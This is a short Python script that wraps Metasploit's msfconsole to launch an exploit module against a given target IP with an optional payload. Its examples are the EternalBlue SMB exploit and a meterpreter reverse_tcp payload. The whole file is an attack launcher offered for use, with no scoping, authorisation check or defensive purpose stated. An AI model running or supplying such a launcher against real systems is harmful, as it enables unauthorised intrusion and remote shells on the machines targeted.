import subprocess
import platform

def run_exploit(msf_module, target_ip, payload=None):
    """
    Launches a Metasploit exploit module against the target IP.

    Args:
        msf_module (str): Metasploit module path (e.g., exploit/windows/smb/ms17_010_eternalblue)
        target_ip (str): Target IP address
        payload (str, optional): Metasploit payload 
                                 (e.g., windows/x64/meterpreter/reverse_tcp)
    """
    # Build msfconsole command
    msf_command = f"use {msf_module}; set RHOSTS {target_ip};"
    if payload:
        msf_command += f" set PAYLOAD {payload};"
    msf_command += " run; exit"

    # Determine msfconsole executable based on OS
    msf_path = "msfconsole.bat" if platform.system().lower().startswith("win") else "msfconsole"

    print(f"[*] Launching exploit '{msf_module}' on {target_ip}...")
    try:
        subprocess.run(
            [msf_path, "-q", "-x", msf_command],
            check=True
        )
    except subprocess.CalledProcessError as e:
        print(f"[!] Exploit failed with error code {e.returncode}: {e}")
    except FileNotFoundError:
        print("[!] Metasploit not found. Please install it and add it to your PATH.")
